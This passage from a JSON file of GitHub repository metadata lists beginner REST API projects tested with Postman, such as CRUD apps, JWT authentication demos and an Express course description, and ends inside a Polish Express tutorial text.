    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26123728,
    "owner_login": "pranshugarg",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26123728?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "user",
      "mongo",
      "auth",
      "list",
      "authentication",
      "update",
      "delete",
      "account",
      "wherein"
    ]
  },
  {
    "id": 190986359,
    "name": "BooksAppReactJS-CRUD-basic",
    "full_name": "papiuiulia/BooksAppReactJS-CRUD-basic",
    "description": "I created an application in ReactJS with REST services accomplished in Postman(an online tool). The user can add new books, edit existing ones or remove them.",
    "fork": false,
    "created_at": "2019-06-09T09:15:06Z",
    "updated_at": "2019-06-09T09:24:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44809460,
    "owner_login": "papiuiulia",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/44809460?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "application",
      "service",
      "tool",
      "user",
      "line",
      "services",
      "book",
      "edit",
      "books",
      "online",
      "accomplished"
    ]
  },
  {
    "id": 136736899,
    "name": "JWTApplication",
    "full_name": "BhaveshBangera/JWTApplication",
    "description": "This is a basic application built using Django-REST Framework. Here when a user is authenticated, he is provided a token (i.e. JSON Web Token) by the Authentication Server, with the help of which he is able to make an API Call to our Application. Our Application verifies the token and then only user gets access to API data.",
    "fork": false,
    "created_at": "2018-06-09T15:50:25Z",
    "updated_at": "2018-06-09T16:11:23Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39965053,
    "owner_login": "BhaveshBangera",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/39965053?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "application",
      "user",
      "auth",
      "help",
      "built",
      "provide",
      "access",
      "token",
      "provided",
      "authenticate",
      "gets",
      "authenticated"
    ]
  },
  {
    "id": 128530193,
    "name": "springboot-testing-mysql",
    "full_name": "ivangfr/springboot-testing-mysql",
    "description": "The goals of this project are: 1) Create a simple Spring Boot REST API to manage users called user-service. The database used is MySQL; 2) Explore the utilities and annotations that Spring Boot provides when testing applications. 3) Testing with Postman and Newman",
    "fork": false,
    "created_at": "2018-04-07T13:20:13Z",
    "updated_at": "2020-03-28T11:27:06Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 10564548,
    "owner_login": "ivangfr",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/10564548?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "testing",
      "application",
      "service",
      "call",
      "database",
      "user",
      "util",
      "manage",
      "users",
      "provide",
      "applications",
      "provides",
      "utilities",
      "goal",
      "notation",
      "goals"
    ]
  },
  {
    "id": 228832804,
    "name": "userPosts",
    "full_name": "param2404/userPosts",
    "description": "C.R.U.D operation using REST APIs and Mongoose . 1. Create two collections (User,Post) using mongoose.model USER: name, phone,email etc. POST: title,description etc. 2. Add users/post through POSTMAN and check the result in robo3t.(CREATE-post) 3.Fetch users/post through POSTMAN and check the result in robo3t.(READ-get) 4.Update users/post through POSTMAN and check the result in robo3t.(UPDATE-patch) 5.Delete users/post through POSTMAN and check the result in robo3t.(DELETE-delete) 6.Fetch a particular user's post using its id or name .",
    "fork": false,
    "created_at": "2019-12-18T12:11:29Z",
    "updated_at": "2019-12-18T12:14:11Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 59016540,
    "owner_login": "param2404",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/59016540?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "script",
      "user",
      "mongo",
      "mail",
      "operation",
      "users",
      "delete",
      "email",
      "name",
      "check",
      "model",
      "result",
      "mongoose",
      "desc",
      "description",
      "title",
      "robo",
      "patch",
      "robo3t"
    ]
  },
  {
    "id": 107671514,
    "name": "lara-api",
    "full_name": "binoysarker/lara-api",
    "description": "My first REST API using laravel and Postman. I have worked with the users,posts,likes using different relational statement like polymorphic relation and i also use separate requests and policies with this.   ",
    "fork": false,
    "created_at": "2017-10-20T11:45:33Z",
    "updated_at": "2017-10-20T11:47:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26120595,
    "owner_login": "binoysarker",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26120595?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "requests",
      "user",
      "users",
      "rent",
      "stat",
      "laravel",
      "posts",
      "worked"
    ]
  },
  {
    "id": 169711642,
    "name": "Todo-Api",
    "full_name": "sahilwasan000/Todo-Api",
    "description": "A REST API that lets the user, use the end points and create his own application using the API. It uses Node.js, Express and MongoDB for development and Mocha and Postman for testing purposes.",
    "fork": false,
    "created_at": "2019-02-08T09:32:10Z",
    "updated_at": "2019-04-07T15:56:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32892440,
    "owner_login": "sahilwasan000",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/32892440?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "application",
      "user",
      "develop",
      "points",
      "development",
      "uses",
      "purposes",
      "lets"
    ]
  },
  {
    "id": 184787202,
    "name": "MERN-CRUD",
    "full_name": "AmanUllah710/MERN-CRUD",
    "description": "Simple application to delete and register user in through REACT front-end but you perform all the CRUD operations using POSTMAN. In REST api all the opertions are working perfectly,",
    "fork": false,
    "created_at": "2019-05-03T16:26:04Z",
    "updated_at": "2019-05-05T11:29:05Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 27359152,
    "owner_login": "AmanUllah710",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/27359152?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "application",
      "user",
      "operation",
      "front",
      "operations",
      "delete",
      "perform",
      "working",
      "register",
      "perfect"
    ]
  },
  {
    "id": 135631271,
    "name": "CloudAPI",
    "full_name": "Tiausa/CloudAPI",
    "description": "Implemented REST API that supported user account using 3rd party providers and account specific information. Used non-relational database to support related entities. Created full test suite using Postman. ",
    "fork": false,
    "created_at": "2018-05-31T20:18:11Z",
    "updated_at": "2018-05-31T20:26:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 11865853,
    "owner_login": "Tiausa",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/11865853?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "form",
      "database",
      "user",
      "format",
      "spec",
      "full",
      "provide",
      "info",
      "infor",
      "information",
      "support",
      "specific",
      "account",
      "related",
      "party",
      "suite",
      "test suite",
      "supported",
      "provider"
    ]
  },
  {
    "id": 119587689,
    "name": "SmackApplication",
    "full_name": "sonali-developer/SmackApplication",
    "description": "App Description: A clone of chat application namely Slack. It is a full fledged and professional looking ready to publish app on Appstore. It allows first time user to register by providing unique username, email and password along with selection of Avatar and Avatar's Background color; login using registered email and password, participate in channels available for chat, create new channel by adding users, perform live chat with other users of this app, can even logout, and so on.  • Built using Xcode 9, Swift 4, Cocoa pods, node.js, MongoDB, Heroku, Postman, etc. for iOS 11 based iPhones and iPads.  • Local Frameworks used includes Foundation, UIKit and other API's like Alamofire, SwiftyJSON, SocketIO, REST, SWReveal, etc.  • Demonstrated the use of Networking in iOS.  • Implemented Web Request creation in Xcode using UIKit, APIs, node.js and Mongo dB online. • Implemented Web service API hosting online using Heroku and local hosting using Postman. • Implemented user creation and real time talking using Socket Technology through SocketIO library.  • Implemented Web Service for User Registration, Authentication & Login, Channels Creation & display, fetching, sending and saving text messages and many more.  • Implemented Table Views, Collection Views & custom design of their cells using data models.  • Implemented side menu for the display of user profile and channels using SWReveal and Gradient color design code for providing gradient color background to this side menu.  • Implemented creation of two XIB's for Channels creation and profile view’s popUp.  • Implemented SegmentedControl for displaying 28 Dark and Light Avatar displays and code for generating Avatar’s background color on user registration screen.  • Implemented Input Accessory View for Text field.  • In all designed around eight View Controllers and their corresponding storyboard file for GUI design, Four Services, two custom cells, seven view files, two model files and lots of assets and so on. ",
    "fork": false,
    "created_at": "2018-01-30T20:02:55Z",
    "updated_at": "2018-06-24T20:51:57Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 20232921,
    "owner_login": "sonali-developer",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20232921?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "data",
      "form",
      "file",
      "application",
      "script",
      "service",
      "node",
      "user",
      "based",
      "code",
      "sign",
      "mail",
      "line",
      "files",
      "send",
      "local",
      "full",
      "read",
      "users",
      "more",
      "library",
      "view",
      "host",
      "email",
      "perform",
      "rating",
      "store",
      "play",
      "name",
      "working",
      "side",
      "allows",
      "long",
      "model",
      "custom",
      "message",
      "text",
      "design",
      "includes",
      "login",
      "along",
      "available",
      "clone",
      "designed",
      "fetch",
      "creation",
      "sending",
      "around",
      "ready",
      "many",
      "messages",
      "online",
      "sets",
      "display",
      "models",
      "register",
      "select",
      "generating",
      "fire",
      "playing",
      "profile",
      "adding",
      "talk",
      "hosting",
      "providing",
      "registration",
      "chat",
      "saving",
      "background",
      "namely",
      "fetching",
      "selection",
      "real time",
      "lots"
    ]
  },
  {
    "id": 91374388,
    "name": "JWT-Authentication",
    "full_name": "kpraneeth3456/JWT-Authentication",
    "description": "Project Title: JWT Authentication  Description: This project is a basic Authorization and Authentication which exchanges JSON web tokens between the client and the server for more security.  Execution: -Clone or download the repo from the GitHub link -npm install (to download the dependencies) -node index.js (To get the application running)  Working: -User has to enter his email and password to register his account.(Use any third-party rest-client like Postman on port 3000) -If the email already exists in the database it sends an error message and if the email does not exist it saves to the database. -If the user is signed up then he can go ahead and Sign-in with same username and password. -If the credentials are matched then a JSON web token will be sent to the client in the header. -If the username and password do not match then it sends back an error message.",
    "fork": false,
    "created_at": "2017-05-15T19:03:55Z",
    "updated_at": "2018-12-28T08:47:41Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 26414547,
    "owner_login": "kpraneeth3456",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26414547?v=4",
    "pulled": 1,
    "tags": [
      "repo",
      "data",
      "application",
      "rest",
      "script",
      "server",
      "client",
      "node",
      "database",
      "user",
      "sign",
      "mail",
      "send",
      "load",
      "read",
      "running",
      "more",
      "email",
      "name",
      "token",
      "message",
      "to do",
      "install",
      "between",
      "link",
      "header",
      "account",
      "download",
      "enter",
      "ready",
      "party",
      "register",
      "sends",
      "third",
      "dependencies",
      "tokens",
      "error",
      "match",
      "security",
      "exchange",
      "matched"
    ]
  },
  {
    "id": 215877357,
    "name": "busticketing",
    "full_name": "Mir00r/busticketing",
    "description": "Bus Reservation System_ and tried to implement an Admin portal which can be operated over browsers and a series of REST APIs to interact with the system using mobile applications or frontend applications written for the browsers. The complete systems has two important actors :  1. Admin user 2. End user  The _Admin user_ can access this application on browser (laptop or mobile/tablet, doesn't really matter as this is built using bootstrap, material design and is completely responsive) and can perform the following actions :  1. Signup 2. Login (Spring sessions) 3. Update their profile 4. Create an agency 5. Add buses to the agency 6. Add trips consisting of predefined stops and buses   The _End user_ can use their mobile application (yet to be built, however the REST APIs are ready and could be used via Postman or Swagger) to perform the following actions :  1. Signup 2. Login (and get a JWT token)  3. List all available stops 4. Search a trip between any two stops 5. Filter search results with a date option 6. Book a ticket for a given trip schedule  Admin interface and REST APIs both have their independent authentication mechanisms, the web application uses the cookie based authentication (provided by default by Spring security) and the REST API uses the JWT authentication for access. This application assumes the availability of 'MongoDB' installation on the localhost where the server will run or the use of docker-compose to boot up a mysqldb container and link the application with it within the realm of docker.  Any changes that the admin users will do on the web portal will impact the search results of the end users, there will be certain use cases which you may find missing here, I hope you will appreciate that the overall idea was to present a way to create such an application completely inside the realm of Spring Boot and not to actually building a fully functional reservation system.  The admin user interface is completely written in material design using Bootstrap v4 and is responsive to suite a variety of devices. The template engine used to render the admin views is Thymeleaf since the library is extremely extensible and its natural templating capability ensures templates can be prototyped without a back-end – which makes development very fast when compared with other popular template engines such as JSP.",
    "fork": false,
    "created_at": "2019-10-17T20:11:48Z",
    "updated_at": "2019-12-18T20:19:33Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 2,
    "watchers": 1,
    "score": 1,
    "owner_id": 11166444,
    "owner_login": "Mir00r",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/11166444?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "file",
      "application",
      "server",
      "user",
      "based",
      "develop",
      "implement",
      "contain",
      "sign",
      "auth",
      "build",
      "function",
      "local",
      "full",
      "read",
      "import",
      "interact",
      "built",
      "authentication",
      "front",
      "users",
      "library",
      "boot",
      "plate",
      "view",
      "host",
      "development",
      "face",
      "written",
      "very",
      "perform",
      "functional",
      "provide",
      "system",
      "access",
      "action",
      "side",
      "browser",
      "search",
      "web app",
      "mysql",
      "docker",
      "uses",
      "ever",
      "template",
      "case",
      "result",
      "interface",
      "token",
      "complete",
      "building",
      "design",
      "ully",
      "type",
      "fully",
      "install",
      "between",
      "link",
      "frontend",
      "available",
      "results",
      "applications",
      "within",
      "provided",
      "cases",
      "following",
      "mobile",
      "ready",
      "find",
      "given",
      "container",
      "popular",
      "actor",
      "suite",
      "define",
      "default",
      "templates",
      "both",
      "such",
      "engine",
      "sessions",
      "mechanism",
      "profile",
      "schedule",
      "consist",
      "render",
      "admin",
      "pact",
      "security",
      "makes",
      "systems",
      "important",
      "inside",
      "compose",
      "fully functional",
      "material",
      "series",
      "ticket",
      "responsive",
      "operate",
      "compare",
      "prototype",
      "completely",
      "idea",
      "consisting",
      "actually",
      "devices",
      "reservation",
      "predefined"
    ]
  },
  {
    "id": 165355829,
    "name": "api-hub",
    "full_name": "harenlewis/api-hub",
    "description": "A mock server application where in development or dummy APIs can be created and accessed by multiple users. Similar to Postman's advanced mock server.",
    "fork": false,
    "created_at": "2019-01-12T06:37:09Z",
    "updated_at": "2019-01-15T19:46:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12905568,
    "owner_login": "harenlewis",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/12905568?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "application",
      "server",
      "user",
      "develop",
      "users",
      "mock",
      "development",
      "access",
      "esse",
      "multiple",
      "advance",
      "advanced",
      "dummy",
      "accessed"
    ]
  },
  {
    "id": 212612216,
    "name": "Implementing-JWT-using-Node.js",
    "full_name": "mohitsood5934/Implementing-JWT-using-Node.js",
    "description": "I have implemented JSON Web Token for user authentication.I have used POSTMAN API for the testing purpose",
    "fork": false,
    "created_at": "2019-10-03T15:20:58Z",
    "updated_at": "2019-10-03T15:30:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26309496,
    "owner_login": "mohitsood5934",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26309496?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "user",
      "implement",
      "auth",
      "authentication",
      "implemented"
    ]
  },
  {
    "id": 193157969,
    "name": "jsonwebtoken",
    "full_name": "gloryer/jsonwebtoken",
    "description": "A demo back end server exposes user registration endpoint, user authentication endpoint, token endpoint and resource endpoint. The resource endpoint is protected by the JWT token. Only the client who possesses the valid token can access the resource. To get a token from the server, the client must authenticates itself to the server. To request the resource in the server, the client issue an http GET request to the resource endpoint, the server will verify the recieved jwt token. Once the token is valid, the server will send back the user information which indicated in the jwt token.  Front-end has not been implemented so far. The back-end is tested using Postman.",
    "fork": false,
    "created_at": "2019-06-21T20:43:09Z",
    "updated_at": "2019-06-21T20:52:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 18592154,
    "owner_login": "gloryer",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/18592154?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "request",
      "form",
      "server",
      "client",
      "http",
      "user",
      "implement",
      "format",
      "auth",
      "endpoint",
      "tested",
      "demo",
      "send",
      "source",
      "authentication",
      "info",
      "access",
      "infor",
      "resource",
      "information",
      "token",
      "esse",
      "implemented",
      "expose",
      "been",
      "authenticate",
      "exposes",
      "back end",
      "verify",
      "issue",
      "registration",
      "recieve"
    ]
  },
  {
    "id": 187572200,
    "name": "PaymentService",
    "full_name": "anshhora7/PaymentService",
    "description": "Payment Service is a Sring Boot service, which allows user to subscribe a plan aacording to its use. Postman is also used here to provide JSON objects and the nesseccery parameters for the project.",
    "fork": false,
    "created_at": "2019-05-20T05:18:24Z",
    "updated_at": "2019-05-23T08:43:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 46044644,
    "owner_login": "anshhora7",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/46044644?v=4",
    "pulled": 1,
    "tags": [
      "service",
      "user",
      "provide",
      "allows",
      "object",
      "esse",
      "parameter",
      "objects"
    ]
  },
  {
    "id": 117618110,
    "name": "spring-security-db",
    "full_name": "mmsrgit/spring-security-db",
    "description": "This objective of this project is to perform CRUD operations in a secured way. BASIC authentication is required to insert/update/read/delete the records from RECORDS table using following URLs.  http://localhost:8080/all - GET http://localhost:8080/getSimpleRecord http://localhost:8080/secured/getRecords http://localhost:8080/secured/getRecord/2 http://localhost:8080/secured/createRecord - POST http://localhost:8080/secured/updateRecord - PUT http://localhost:8080/secured/deleteRecord - DELETE  The URLs having secured in it, needs to be hit using BASIC authentication in POSTMAN using mmsr/mmsr as username and password. The default format of the records displayed is json. But you can also view the records in XML by appending the urls with \".xml\" e.g.  http://localhost:8080/secured/getAllRecords - JSON http://localhost:8080/secured/getAllRecords.xml - XML",
    "fork": false,
    "created_at": "2018-01-16T02:05:10Z",
    "updated_at": "2018-12-15T19:19:52Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 26504427,
    "owner_login": "mmsrgit",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26504427?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "json",
      "http",
      "user",
      "format",
      "auth",
      "operation",
      "local",
      "read",
      "authentication",
      "operations",
      "update",
      "view",
      "host",
      "delete",
      "perform",
      "play",
      "need",
      "name",
      "object",
      "require",
      "following",
      "needs",
      "default",
      "display",
      "required",
      "having",
      "insert",
      "secure",
      "secured",
      "urls",
      "objective"
    ]
  },
  {
    "id": 82122922,
    "name": "chatapp",
    "full_name": "Inn4ki/chatapp",
    "description": "NODE.JS WEB APPS WITH EXPRESS by Wes Higbee  In this Node.js Web Apps with Express training course, expert author Wes Higbee will teach you how to create web applications and APIs with Express. This course is designed for users that are already familiar with HTML, CSS, and JavaScript.  You will start by learning how to set up a web app, then jump into learning about the Jade view engine. From there, Wes will teach you about CRUD, including how to add the chat room view, respond with JSON, and edit chat rooms. This video tutorial also covers routers, middleware, APIs, and logging and debugging. Finally, you will learn about auth with passport, including passport user validation, protecting admin routes, and query string parameters.  Once you have completed this computer based training course, you will have learned how to create web applications and APIs with Express. Working files are included, allowing you to follow along with the author throughout the lessons.  About the Publisher  Presented in stunning HD quality, the Infinite Skills range of video based training provides a clear and concise way to learn computer applications and programming languages at your own speed. Delivered to your Desktop, iPad ...  More about Infinite Skills Table of Contents Setting Up A Web App What You Will Learn 00:03:28 About The Author 00:01:23 Project Setup 00:02:14 Spinning Up Our Server From Scratch 00:05:11 Serving Index.HTML 00:04:32 Serving Bootstrap Assets 00:05:52 Styling Our Site 00:01:16 How To Access Your Working Files 00:01:15 The Jade View Engine Why View Engines? 00:02:10 The Jade View Engine 00:06:32 HTML Tags In Jade 00:02:16 Attributes Classes And Ids In Jade 00:02:06 Serving Up Jade Views 00:04:24 HTML Reuse In Jade 00:06:26 Code In Jade Views 00:02:37 Passing Data To View Rendering 00:02:01 Setting A Default View Engine 00:00:37 String Interpolation In Jade 00:02:30 Generating Tables In Jade 00:03:50 Tabs And Spaces Oh My 00:01:21 Demystifying Jade 00:02:21 Crud Setting The Stage 00:01:01 Add Chat Room View 00:04:21 Post Chat Room Form 00:06:56 Parsing Form Data From The Request Body 00:04:22 Responding With JSON 00:03:20 Admin Chat Rooms Workflow 00:02:21 Named Route Parameters To Delete Rooms 00:05:59 Edit Chat Rooms 00:06:01 Edit Chat Rooms Part - 2 00:02:00 Responding With 404 Not Found 00:01:39 Wrap Up 00:01:23 Routers Extracting An Admin Module 00:04:47 Modular Admin Router 00:04:00 Pluggable Admin Mount Path 00:03:15 Stumbling Block - Relative Redirects 00:02:49 Chaining Routes 00:01:57 Middleware Understanding Routing And Middleware 00:05:45 Adding Custom Logging Middleware 00:02:15 Understanding Next() 00:01:31 Middleware To Fetch Data 00:07:24 Order Matters.Av 00:01:09 Scoping Middleware 00:03:53 What To Do With Errors 00:03:01 Last Thoughts 00:03:19 APIs A Client Side Chat App 00:01:55 Setup The Client Side Chat App 00:03:01 Creating An API 00:05:42 Modules Are Singletons 00:01:50 Postman To Test API 00:01:24 API Get Room Messages 00:05:49 Posting To An API 00:03:37 API To Delete Messages 00:03:15 Parsing JSON In The Request Body 00:03:25 Logging And Debugging Express-Debug 00:03:03 Logging With Morgan 00:01:45 File Access Log With Morgan 00:01:28 Built-In Express Debugging 00:01:57 When Things Go Wrong Throwing An Error In A Route Handler 00:01:39 Errors In Production 00:01:53 Custom Error Handlers 00:02:40 Browser Hangs 00:00:58 Hanging Async Request Handlers 00:01:17 Errors In Callbacks 00:03:32 Don't Swallow Callback Errors 00:02:46 Auth With Passport Auth With Passport 00:01:49 Login Form 00:06:31 Passport User Validation 00:05:20 Passport Session Serialization 00:01:49 Logging In 00:06:23 Logout 00:03:52 Authorizing Access To Block Anonymous Users 00:03:40 Protecting Admin Routes 00:02:04 Using User Information 00:02:48 Bypassing Login In Development 00:03:11 Query String Parameters 00:02:34 Auth Cookies 00:02:17 Last Thoughts 00:05:45  Publisher: Infinite Skills Release Date: March 2016 ISBN: 9781491958933 Running time: 4:09:49 Topic: Node.js",
    "fork": false,
    "created_at": "2017-02-16T00:56:43Z",
    "updated_at": "2019-11-16T05:23:17Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 5,
    "watchers": 4,
    "score": 1,
    "owner_id": 9013039,
    "owner_login": "Inn4ki",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/9013039?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "file",
      "application",
      "user",
      "based",
      "sign",
      "format",
      "auth",
      "files",
      "route",
      "routes",
      "star",
      "read",
      "users",
      "learn",
      "view",
      "course",
      "start",
      "rating",
      "provide",
      "learning",
      "program",
      "tutorial",
      "web app",
      "long",
      "lang",
      "complete",
      "design",
      "edit",
      "including",
      "along",
      "applications",
      "included",
      "validation",
      "designed",
      "sync",
      "parameter",
      "middleware",
      "ready",
      "debug",
      "query",
      "sets",
      "provides",
      "training",
      "router",
      "engine",
      "language",
      "covers",
      "passport",
      "lesson",
      "admin",
      "programming",
      "familiar",
      "logging",
      "passing",
      "debugging",
      "video",
      "quality",
      "chat",
      "protecting",
      "completed",
      "speed",
      "learned",
      "computer"
    ]
  },
  {
    "id": 119091462,
    "name": "Zadanie_17_5",
    "full_name": "martinproxy0/Zadanie_17_5",
    "description": " 17. ExpressJS - ekspresowe tworzenie aplikacji w NodeJS Wyzwania: Dowiesz się czym jest ExpressJS Nauczysz się korzystać z routingu Poznasz czym są szablony 17.1. Wprowadzenie do Expressa Express jest jednym z najpopularniejszych frameworków dla aplikacji pisanych w Node.js. Jest bardzo lekki i pozwala na lepszą organizację aplikacji w modelu MVC. Ok, zwolnijmy. Już na samym starcie pojawiły się dwa pojęcia, których do tej pory nie omówiliśmy zbyt dokładnie: framework i MVC. Na początku przypomnijmy sobie czym jest framework.  Czym są frameworki? Framework to swego rodzaju szkielet, na którym opieramy budowę naszej aplikacji. Jest pewnym poziomem abstrakcji, na której konstruujemy naszą aplikację.  Czym jest abstrakcja? Abstrakcja w inżynierii oprogramowania to technika, dzięki której jesteśmy w stanie zapanować nad złożonością systemu. Najzwyczajniej w świecie nie da się myśleć na wielu płaszczyznach na raz, dlatego programiści dzielą problemy na pewne poziomy i to na nich rozwiązują mniejsze problemy. Przykładowo - programista korzystający z Reacta nie martwi się o niższy poziom abstrakcji, z którego nieświadomie korzysta używając Reacta. Korzystając z komputera także nie zastanawiamy się za bardzo co dzieje się w środku procesora czy też w jaki sposób jest skonstruowany. Tym poziomem abstrakcji po prostu nie zawracamy sobie głowy. Używając JavaScriptu nie myślimy w jaki sposób parser analizuje składnię języka. Jeśli nie jest to nam potrzebne, to możemy zająć się tym, co jest dla nas naprawdę istotne - pisaniem aplikacji internetowych!  Express to właśnie kolejny, wyższy poziom abstrakcji, dzięki któremu możemy skupić się na właściwym problemie. Zawiera zbiór generycznych (możliwych do zastosowania w wielu miejscach / uniwersalnych) funkcjonalności, które powtarzają się w obrębie każdej aplikacji. Cały zamysł frameworka opiera się na zasadzie - nie wymyślaj koła na nowo, bo można budować na podstawie dobrych, uniwersalnych rozwiązań. Po wykonaniu tego samego zadania wiele razy, człowiek instynktownie szuka sposobu na automatyzację problemu - szczególnie leniwy programista. :)  Framework ma niestety jedną wadę, która bywa momentami również zaletą - narzuca programiście sposób w jaki należy rozwiązać problem. Takie podejście z jednej strony nieco nas ogranicza, bo nie pozwala nam 'grzebać' w rozwiązaniu, a z drugiej strony zmniejsza ilość miejsc, w których moglibyśmy popełnić jakiś błąd. Zaletą takiego podejścia jest też to, że programiści korzystający z frameworków często borykają się z podobnymi problemami, przez co łatwo jest znaleźć rozwiązania, bo ktoś już na pewno zetknął się z czymś, co sprawia nam kłopot :)  Wracając do Expressa - jest on niewielkim frameworkiem, który daje programiście przyjemną podstawkę do tworzenia aplikacji, ale nie narzuca żadnych praktyk - może o tym świadczyć chociażby fakt, że wiele znanych frameworków opiera swoją budowę na Express. Można do nich zaliczyć przykładowo Loopbacka, Sailsa czy Krakena.  Model-View-Controller Ok, wiemy już czym jest framework - pora na pojęcie MVC :) Jest to skrót od ang. Model View Controller (Model Widok Kontroler). Jest jednym z najczęściej przewijających się wzorców architektonicznych w internecie. Popularnością pomału wypiera go architektura Flux, o której coraz częściej słychać (szczególnie w środowisku Reacta), ale o tym wzorcu powiemy sobie jeszcze przy okazji omawiania Reduxa - wróćmy do MVC.  Głównym założeniem przyjętym podczas projektowania MVC było oddzielenie warstwy prezentacji od logiki biznesowej aplikacji. To podejście umożliwia tworzenie narzędzi działających bez graficznego interfejsu (zastępuje go wtedy tzw. Command Line Interface, a.k.a. CLI) i jest dalej popularne w środowisku Unixowym. Tak więc:  Model jest reprezentacją logiki aplikacji / problemu z jakim się zmagamy / domeną. Widok opisuje w jaki sposób coś wyświetlić. W React są to komponenty (szczególnie te prezentacyjne). Kontroler przyjmuje dane od użytkownika aplikacji i reaguje na jego działania w obrębie widoku. Aktualizuje widok i model aplikacji. O samej architekturze można napisać osobny moduł tym bardziej, że jak już wcześniej wspomnieliśmy bardzo często przewija się on w środowisku front-end developerów i jest częścią składową wielu frameworków. Sama implementacja MVC wymaga wiedzy na temat programowania obiektowego i wzorców projektowych. Zainteresowanych zapraszam do przeczytania tej książki na temat wzorców projektowych stosowanych w JavaScripcie.  Express dostarcza wielu funkcjonalności do tworzenia aplikacji webowych. Jak już wspomniałem, ułatwia on przede wszystkim szybki rozwój aplikacji opartych na Node.js. Podstawowymi cechami tego frameworka są:  serwowanie plików statycznych za pomocą jednej komendy konfigurowanie middleware, czyli pośrednika między żądaniem a odpowiedzią w momencie, kiedy użytkownik wykonuje jakieś akcje, np. wysyła formularz, middleware może wykonać pewne czynności zanim dane zostaną zapisane. Nie sprowadza się to oczywiście tylko do zapisu danych, ale szerzej na temat tego zagadnienia powiemy sobie w dalszym rozdziale definiowanie tablicy routingu, czyli ścieżek (adresów), które wyświetlają odpowiednie treści, przyjmują i zapisują dane, bądź odpytane o dane zwracają je. Bazują na protokole HTTP oraz URI (ang. Uniform Resource Identifier) pozwala na dynamiczne tworzenie stron HTML bazujących na argumentach przekazanych do istniejących szablonów Nie przejmuj się, jeśli powyższe opisy wydają się być nieco zagmatwane. Kolejne rozdziały rozjaśnią sprawę! Zanim jednak przejdziemy do omawiania poszczególnych funkcjonalności Expressa, przeprowadzimy proces instalacji.  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.2. Instalacja ExpressJS Framework Express instalujemy używając npm, analogicznie do innych pakietów, które dodawaliśmy już we wcześniejszych modułach. Dla przypomnienia, wystarczy, że zainicjujesz swój projekt - npm init, a następnie użyjesz komendy npm install express --save, która zapisze zainstalowany pakiet w katalogu node_modules/ i doda go do sekcji dependencies w pliku package.json.  Razem z Expressem należy zainstalować jeszcze jeden ważny moduł - body-parser, który jest pakietem pozwalającym na obsługę różnych formatów danych w middleware takich jak JSON, text czy tzw. surowe dane (ang. raw data). Aby go zainstalować, wpisz npm install body-parser --save.  Pierwsza aplikacja w ExpressJS Sprawdźmy teraz, czy 